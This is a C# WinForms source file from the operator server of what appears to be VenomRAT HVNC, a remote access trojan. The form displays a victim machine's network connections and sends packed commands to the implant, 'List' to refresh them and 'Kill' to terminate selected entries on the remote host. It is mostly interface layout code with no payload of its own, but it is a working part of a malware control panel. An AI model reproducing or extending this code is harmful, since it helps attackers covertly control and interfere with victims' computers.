using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Forms
{
    public class FormNetstat : Form
    {
        private IContainer components;
        private ColumnHeader lv_id;
        public ListView listView1;
        private ContextMenuStrip contextMenuStrip1;
        private ToolStripMenuItem killToolStripMenuItem;
        private ToolStripMenuItem refreshToolStripMenuItem;
        public System.Windows.Forms.Timer timer1;
        private ColumnHeader lv_localAddr;
        private ColumnHeader lv_remoteAddr;
        private ColumnHeader lv_state;
        private Guna2DragControl guna2DragControl1;
        private Guna2Panel guna2Panel1;
        private Guna2ControlBox guna2ControlBox1;
        private Guna2Separator guna2Separator2;
        private Guna2Separator guna2Separator1;
        private Label label1;
        private Guna2BorderlessForm guna2BorderlessForm1;

        public Form1 F { get; set; }

        internal Clients Client { get; set; }

        internal Clients ParentClient { get; set; }

        public FormNetstat() => this.InitializeComponent();

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (this.Client.TcpClient.Connected && this.ParentClient.TcpClient.Connected)
                    return;
                this.Close();
            }
            catch
            {
                this.Close();
            }
        }

        private async void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FormNetstat formNetstat1 = this;
            if (formNetstat1.listView1.SelectedItems.Count <= 0)
                return;
            foreach (ListViewItem selectedItem in formNetstat1.listView1.SelectedItems)
            {
                FormNetstat formNetstat = formNetstat1;
                ListViewItem P = selectedItem;
                await Task.Run((Action)(() =>
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "Netstat";
                    msgPack.ForcePathObject("Option").AsString = "Kill";
                    msgPack.ForcePathObject("ID").AsString = P.SubItems[formNetstat.lv_id.Index].Text;
                    ThreadPool.QueueUserWorkItem(new WaitCallback(formNetstat.Client.Send), (object)msgPack.Encode2Bytes());
                }));
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e) => ThreadPool.QueueUserWorkItem((WaitCallback)(o =>
             {
                 MsgPack msgPack = new MsgPack();
                 msgPack.ForcePathObject("Pac_ket").AsString = "Netstat";
                 msgPack.ForcePathObject("Option").AsString = "List";
                 ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object)msgPack.Encode2Bytes());
             }));

        private void FormNetstat_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                ThreadPool.QueueUserWorkItem((WaitCallback)(o => this.Client?.Disconnected()));
            }
            catch
            {
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
                this.components.Dispose();
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = (IContainer)new Container();
            ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(FormNetstat));
            this.listView1 = new ListView();
            this.lv_id = new ColumnHeader();
            this.lv_localAddr = new ColumnHeader();
            this.lv_remoteAddr = new ColumnHeader();
            this.lv_state = new ColumnHeader();
            this.contextMenuStrip1 = new ContextMenuStrip(this.components);
            this.killToolStripMenuItem = new ToolStripMenuItem();
            this.refreshToolStripMenuItem = new ToolStripMenuItem();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.guna2DragControl1 = new Guna2DragControl(this.components);
            this.guna2Panel1 = new Guna2Panel();
            this.label1 = new Label();
            this.guna2Separator2 = new Guna2Separator();
            this.guna2Separator1 = new Guna2Separator();
            this.guna2ControlBox1 = new Guna2ControlBox();
            this.guna2BorderlessForm1 = new Guna2BorderlessForm(this.components);
            this.contextMenuStrip1.SuspendLayout();
            ((Control)this.guna2Panel1).SuspendLayout();
            this.SuspendLayout();
            this.listView1.BackColor = Color.FromArgb(30, 30, 30);
            this.listView1.BorderStyle = BorderStyle.None;
            this.listView1.Columns.AddRange(new ColumnHeader[4]
            {
        this.lv_id,
        this.lv_localAddr,
        this.lv_remoteAddr,
        this.lv_state
            });
            this.listView1.ContextMenuStrip = this.contextMenuStrip1;
            this.listView1.Dock = DockStyle.Bottom;
            this.listView1.Enabled = false;
            this.listView1.ForeColor = Color.Gainsboro;
            this.listView1.FullRowSelect = true;
            this.listView1.HeaderStyle = ColumnHeaderStyle.Nonclickable;
            this.listView1.HideSelection = false;
            this.listView1.Location = new Point(0, 58);
            this.listView1.Margin = new Padding(2);
            this.listView1.Name = "listView1";
            this.listView1.ShowGroups = false;
            this.listView1.ShowItemToolTips = true;
            this.listView1.Size = new Size(736, 556);
            this.listView1.Sorting = SortOrder.Ascending;
            this.listView1.TabIndex = 0;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = View.Details;
            this.lv_id.Text = "ID";
            this.lv_id.Width = 92;
            this.lv_localAddr.Text = "LocalAddress";
            this.lv_localAddr.Width = 161;
            this.lv_remoteAddr.Text = "RemoteAddress";
            this.lv_remoteAddr.Width = 177;
            this.lv_state.Text = "State";
            this.lv_state.Width = 110;
            this.contextMenuStrip1.ImageScalingSize = new Size(24, 24);
            this.contextMenuStrip1.Items.AddRange(new ToolStripItem[2]
            {
        (ToolStripItem) this.killToolStripMenuItem,
        (ToolStripItem) this.refreshToolStripMenuItem
            });
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new Size(114, 48);
            this.killToolStripMenuItem.Name = "killToolStripMenuItem";
            this.killToolStripMenuItem.Size = new Size(113, 22);
            this.killToolStripMenuItem.Text = "Kill";
            this.killToolStripMenuItem.Click += new EventHandler(this.killToolStripMenuItem_Click);
            this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
            this.refreshToolStripMenuItem.Size = new Size(113, 22);
            this.refreshToolStripMenuItem.Text = "Refresh";
            this.refreshToolStripMenuItem.Click += new EventHandler(this.refreshToolStripMenuItem_Click);
            this.timer1.Interval = 1000;
            this.timer1.Tick += new EventHandler(this.timer1_Tick);
            this.guna2DragControl1.TargetControl = (Control)this.guna2Panel1;
            ((Control)this.guna2Panel1).BackColor = Color.FromArgb(24, 24, 24);
            ((Control)this.guna2Panel1).Controls.Add((Control)this.label1);
            ((Control)this.guna2Panel1).Controls.Add((Control)this.guna2Separator2);
            ((Control)this.guna2Panel1).Controls.Add((Control)this.guna2Separator1);
            ((Control)this.guna2Panel1).Controls.Add((Control)this.guna2ControlBox1);
            ((Control)this.guna2Panel1).Dock = DockStyle.Top;
            ((Control)this.guna2Panel1).Location = new Point(0, 0);
            ((Control)this.guna2Panel1).Name = "guna2Panel1";
            this.guna2Panel1.ShadowDecoration.Parent = (Control)this.guna2Panel1;
            ((Control)this.guna2Panel1).Size = new Size(736, 62);
            ((Control)this.guna2Panel1).TabIndex = 1;
            this.label1.AutoSize = true;
            this.label1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte)0);
            this.label1.ForeColor = Color.White;
            this.label1.Location = new Point(2, 19);
            this.label1.Name = "label1";
            this.label1.Size = new Size(144, 20);
            this.label1.TabIndex = 130;
            this.label1.Text = "Networks Statistics";
            this.guna2Separator2.FillColor = Color.FromArgb(8, 104, 81);
            this.guna2Separator2.FillStyle = DashStyle.Custom;
            this.guna2Separator2.FillThickness = 2;
            ((Control)this.guna2Separator2).Location = new Point(0, 50);
            ((Control)this.guna2Separator2).Name = "guna2Separator2";
            ((Control)this.guna2Separator2).Size = new Size(736, 12);
            ((Control)this.guna2Separator2).TabIndex = 129;
            this.guna2Separator1.FillColor = Color.FromArgb(8, 104, 81);
            this.guna2Separator1.FillStyle = DashStyle.Custom;
            this.guna2Separator1.FillThickness = 2;
            ((Control)this.guna2Separator1).Location = new Point(0, 0);
            ((Control)this.guna2Separator1).Name = "guna2Separator1";
            ((Control)this.guna2Separator1).Size = new Size(736, 12);
            ((Control)this.guna2Separator1).TabIndex = 129;
            ((Control)this.guna2ControlBox1).Anchor = AnchorStyles.Top | AnchorStyles.Right;
            ((Control)this.guna2ControlBox1).BackColor = Color.Transparent;
            this.guna2ControlBox1.FillColor = Color.Transparent;
            this.guna2ControlBox1.HoverState.Parent = this.guna2ControlBox1;
            this.guna2ControlBox1.IconColor = Color.White;
            ((Control)this.guna2ControlBox1).Location = new Point(689, 12);
            ((Control)this.guna2ControlBox1).Name = "guna2ControlBox1";
            this.guna2ControlBox1.ShadowDecoration.Parent = (Control)this.guna2ControlBox1;
            ((Control)this.guna2ControlBox1).Size = new Size(41, 32);
            ((Control)this.guna2ControlBox1).TabIndex = 16;
            this.guna2BorderlessForm1.AnimateWindow = true;
            this.guna2BorderlessForm1.AnimationType = (Guna2BorderlessForm.AnimateWindowType)1;
            this.guna2BorderlessForm1.ContainerControl = (ContainerControl)this;
            this.guna2BorderlessForm1.DockIndicatorColor = Color.FromArgb(8, 104, 81);
            this.guna2BorderlessForm1.ShadowColor = Color.FromArgb(8, 104, 81);
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.BackColor = Color.FromArgb(39, 39, 39);
            this.ClientSize = new Size(736, 614);
            this.Controls.Add((Control)this.guna2Panel1);
            this.Controls.Add((Control)this.listView1);
            this.FormBorderStyle = FormBorderStyle.None;
            this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
            this.Margin = new Padding(2);
            this.Name = "FormNetstat";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Netstat";
            this.FormClosed += new FormClosedEventHandler(this.FormNetstat_FormClosed);
            this.contextMenuStrip1.ResumeLayout(false);
            ((Control)this.guna2Panel1).ResumeLayout(false);
            ((Control)this.guna2Panel1).PerformLayout();
            this.ResumeLayout(false);
        }
    }
}